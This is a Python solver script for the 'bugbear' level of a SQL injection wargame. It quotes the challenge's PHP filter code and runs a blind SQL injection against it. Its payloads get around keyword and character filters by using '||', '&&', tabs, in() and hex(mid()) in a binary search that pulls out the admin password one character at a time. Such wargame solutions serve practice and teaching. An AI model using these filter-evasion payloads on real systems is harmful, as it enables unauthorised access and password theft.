#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Bugbear

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
    if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
    if(preg_match('/\'|substr|ascii|=|or|and| |like|0x/i', $_GET[no])) exit("HeHe"); 
    $query = "select id from prob_bugbear where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 

    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_bugbear where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("bugbear"); 
    '''

    url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    payload = '0||length(pw)>%s&&id\tin("admin")#'
    len_of_key = los.find_key_len(url, payload, 'no', 'Hello admin', cook)

    print(len_of_key)

    payload = '0||id\tin("admin")&&hex(mid(pw,%s,1))%s#'
    result = los.find_binary(url, payload,
                             'no', 'Hello admin', 0x14, 0x7F, len_of_key, cook)

    print(result)
    # Convert to normal ascii
    p = ''
    for i in result:
        p += bytearray.fromhex(str(ord(i))).decode()
    print(p)

    param = dict(pw=p)
    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Bugbear Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
